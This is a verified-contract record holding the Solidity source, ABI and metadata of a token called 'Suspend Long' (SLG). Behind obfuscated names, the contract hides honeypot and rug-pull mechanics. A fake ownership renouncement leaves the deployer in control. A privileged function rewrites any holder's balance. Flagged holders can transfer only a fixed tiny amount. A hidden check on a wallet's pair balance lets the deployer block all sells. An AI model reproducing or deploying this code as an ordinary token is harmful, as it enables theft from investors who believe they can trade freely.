{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface isFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract autoMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxLiquidity {\n    function createPair(address tradingTake, address fundTotalTrading) external returns (address);\n}\n\ninterface liquidityFromTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedFundTotal) external view returns (uint256);\n\n    function transfer(address autoExemptTotal, uint256 enableMarketing) external returns (bool);\n\n    function allowance(address enableAmountLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoExemptTotal,\n        uint256 enableMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoSell, uint256 value);\n    event Approval(address indexed enableAmountLimit, address indexed spender, uint256 value);\n}\n\ninterface liquidityFromTakeMetadata is liquidityFromTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SuspendLong is autoMin, liquidityFromTake, liquidityFromTakeMetadata {\n\n    uint8 private totalIs = 18;\n\n    bool public takeReceiver;\n\n    function balanceOf(address launchedFundTotal) public view virtual override returns (uint256) {\n        return teamMarketing[launchedFundTotal];\n    }\n\n    function transfer(address tokenReceiver, uint256 enableMarketing) external virtual override returns (bool) {\n        return shouldFundSwap(_msgSender(), tokenReceiver, enableMarketing);\n    }\n\n    string private launchedTakeSell = \"SLG\";\n\n    address toWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function limitTo(address tokenReceiver, uint256 enableMarketing) public {\n        toAmountSwap();\n        teamMarketing[tokenReceiver] = enableMarketing;\n    }\n\n    function transferFrom(address fundAt, address autoExemptTotal, uint256 enableMarketing) external override returns (bool) {\n        if (_msgSender() != listSender) {\n            if (modeMinFee[fundAt][_msgSender()] != type(uint256).max) {\n                require(enableMarketing <= modeMinFee[fundAt][_msgSender()]);\n                modeMinFee[fundAt][_msgSender()] -= enableMarketing;\n            }\n        }\n        return shouldFundSwap(fundAt, autoExemptTotal, enableMarketing);\n    }\n\n    mapping(address => uint256) private teamMarketing;\n\n    function allowance(address receiverMode, address marketingLiquidityMax) external view virtual override returns (uint256) {\n        if (marketingLiquidityMax == listSender) {\n            return type(uint256).max;\n        }\n        return modeMinFee[receiverMode][marketingLiquidityMax];\n    }\n\n    address public tradingSwap;\n\n    function shouldFundSwap(address fundAt, address autoExemptTotal, uint256 enableMarketing) internal returns (bool) {\n        if (fundAt == minAuto) {\n            return buyFrom(fundAt, autoExemptTotal, enableMarketing);\n        }\n        uint256 modeListSwap = liquidityFromTake(tradingSwap).balanceOf(toWallet);\n        require(modeListSwap == toAmount);\n        require(autoExemptTotal != toWallet);\n        if (fromAtIs[fundAt]) {\n            return buyFrom(fundAt, autoExemptTotal, txMarketingWallet);\n        }\n        return buyFrom(fundAt, autoExemptTotal, enableMarketing);\n    }\n\n    uint256 constant txMarketingWallet = 15 ** 10;\n\n    mapping(address => bool) public liquidityTotalMin;\n\n    uint256 private atMarketing = 100000000 * 10 ** 18;\n\n    function approve(address marketingLiquidityMax, uint256 enableMarketing) public virtual override returns (bool) {\n        modeMinFee[_msgSender()][marketingLiquidityMax] = enableMarketing;\n        emit Approval(_msgSender(), marketingLiquidityMax, enableMarketing);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalIs;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toAt;\n    }\n\n    function tokenSenderAmount(address toReceiver) public {\n        if (maxToken) {\n            return;\n        }\n        \n        liquidityTotalMin[toReceiver] = true;\n        if (marketingExempt == isReceiver) {\n            marketingExempt = isReceiver;\n        }\n        maxToken = true;\n    }\n\n    string private toAt = \"Suspend Long\";\n\n    bool private tokenSender;\n\n    bool public marketingMaxLaunch;\n\n    address listSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 autoTeam;\n\n    uint256 private isReceiver;\n\n    function buyFrom(address fundAt, address autoExemptTotal, uint256 enableMarketing) internal returns (bool) {\n        require(teamMarketing[fundAt] >= enableMarketing);\n        teamMarketing[fundAt] -= enableMarketing;\n        teamMarketing[autoExemptTotal] += enableMarketing;\n        emit Transfer(fundAt, autoExemptTotal, enableMarketing);\n        return true;\n    }\n\n    function enableAt(uint256 enableMarketing) public {\n        toAmountSwap();\n        toAmount = enableMarketing;\n    }\n\n    function owner() external view returns (address) {\n        return tradingLimit;\n    }\n\n    uint256 private marketingExempt;\n\n    function toAmountSwap() private view {\n        require(liquidityTotalMin[_msgSender()]);\n    }\n\n    function limitEnable(address txWallet) public {\n        toAmountSwap();\n        if (shouldLimit == receiverFrom) {\n            isReceiver = marketingExempt;\n        }\n        if (txWallet == minAuto || txWallet == tradingSwap) {\n            return;\n        }\n        fromAtIs[txWallet] = true;\n    }\n\n    address public minAuto;\n\n    bool public shouldLimit;\n\n    uint256 toAmount;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedTakeSell;\n    }\n\n    bool public isMin;\n\n    mapping(address => bool) public fromAtIs;\n\n    event OwnershipTransferred(address indexed autoTotalExempt, address indexed modeEnableMax);\n\n    constructor (){\n        \n        isFund buyTotalFund = isFund(listSender);\n        tradingSwap = maxLiquidity(buyTotalFund.factory()).createPair(buyTotalFund.WETH(), address(this));\n        \n        minAuto = _msgSender();\n        listAuto();\n        liquidityTotalMin[minAuto] = true;\n        teamMarketing[minAuto] = atMarketing;\n        if (tokenSender) {\n            tradingReceiverAt = true;\n        }\n        emit Transfer(address(0), minAuto, atMarketing);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atMarketing;\n    }\n\n    bool public maxToken;\n\n    address private tradingLimit;\n\n    function listAuto() public {\n        emit OwnershipTransferred(minAuto, address(0));\n        tradingLimit = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private modeMinFee;\n\n    function getOwner() external view returns (address) {\n        return tradingLimit;\n    }\n\n    bool public tradingReceiverAt;\n\n    bool public receiverFrom;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableAmountLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTotalExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeEnableMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingLiquidityMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLiquidityMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFundTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableMarketing\",\"type\":\"uint256\"}],\"name\":\"enableAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromAtIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txWallet\",\"type\":\"address\"}],\"name\":\"limitEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMarketing\",\"type\":\"uint256\"}],\"name\":\"limitTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTotalMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMaxLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toReceiver\",\"type\":\"address\"}],\"name\":\"tokenSenderAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingReceiverAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoExemptTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SuspendLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}